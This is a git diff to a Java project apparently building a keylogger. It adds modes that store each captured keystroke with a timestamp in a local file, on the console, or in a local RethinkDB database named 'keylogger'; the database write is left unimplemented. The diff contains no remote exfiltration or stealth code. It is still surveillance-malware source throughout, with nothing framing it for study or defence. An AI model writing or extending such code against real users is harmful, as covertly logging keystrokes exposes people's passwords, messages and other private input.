@@ -22,24 +22,51 @@ import com.rethinkdb.RethinkDB;
 import com.rethinkdb.gen.exc.ReqlQueryLogicError;
 import com.rethinkdb.net.Connection;
 
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
+
+enum Mode {
+    DATABASE, 
+    FILE,   // mainly to debug
+    CONSOLE // mainly to debug
+};
+
 public class Keylogger {
+    // DATABASE CONFIGURATION
     private static final String DB_NAME = "keylogger";
     private static final String DB_TABLE_NAME = "keystrokes";
     private static final String DB_HOST = "localhost";
     private static final int DB_PORT = 28015;
-
+    // FILE CONFIGURATION
+    private static final String FILE_PATH = "src\\main\\resources\\keystrokes.txt";
+    
+    private static final Mode mode = Mode.FILE;
     private static final RethinkDB r = RethinkDB.r;
+    private static Connection conn;
 
-    private static void writeToDB(KeyListener keylistener) {
-        while (true){
-            Stroke key = keylistener.pollQueue();
-            if (key != null) {
-                System.out.println(key.getKey());
-            }
+    private static void writeToDB(Stroke key) {
+        if (key != null) {
+            System.out.println("not implemented yet");
+            System.exit(1);
+        }
+    }
+
+    private static void writeToConsole(Stroke key) {
+        if (key != null) {
+            System.out.println(key.getTimestamp() + ": " + key.getKey());
+        }
+        
+    }
+
+    private static void writeToFile(Stroke key) {
+        if (key != null) {
             try {
-                Thread.sleep(100);
-            } catch (InterruptedException e) {
-                // TODO Auto-generated catch block
+                FileWriter myWriter = new FileWriter(FILE_PATH, true);
+                myWriter.write(key.getTimestamp() + ": " + key.getKey() + "\n");
+                myWriter.close();
+            } catch (IOException e) {
+                System.out.println("An error occurred while writing to file.");
                 e.printStackTrace();
             }
         }
@@ -56,6 +83,42 @@ public class Keylogger {
 			e.printStackTrace();
             System.exit(1);
 		}
-        writeToDB(keylistener);
+
+        if (mode == Mode.DATABASE) {
+            conn = r.connection().hostname(DB_HOST).port(DB_PORT).connect();
+            try {
+                r.dbCreate(DB_NAME).run(conn);
+            } catch (ReqlQueryLogicError e) {
+                // database already exists
+            }
+            try {
+                r.db(DB_NAME).tableCreate(DB_TABLE_NAME).run(conn);
+            } catch (ReqlQueryLogicError e) {
+                // table already exists
+            }
+        }
+        else if (mode == Mode.FILE) {
+            try {
+                File file = new File(FILE_PATH);
+                file.createNewFile();
+            } catch (IOException e) {
+                System.out.println("An error occurred while creating the file.");
+                e.printStackTrace();
+                System.exit(1);
+            }
+        }
+
+        while (true){
+            Stroke key = keylistener.pollQueue();
+            if (mode == Mode.DATABASE) {
+                writeToDB(key);
+            }
+            else if (mode == Mode.FILE) {
+                writeToFile(key);
+            }
+            else if (mode == Mode.CONSOLE) {
+                writeToConsole(key);
+            }
+        }
     }
 }
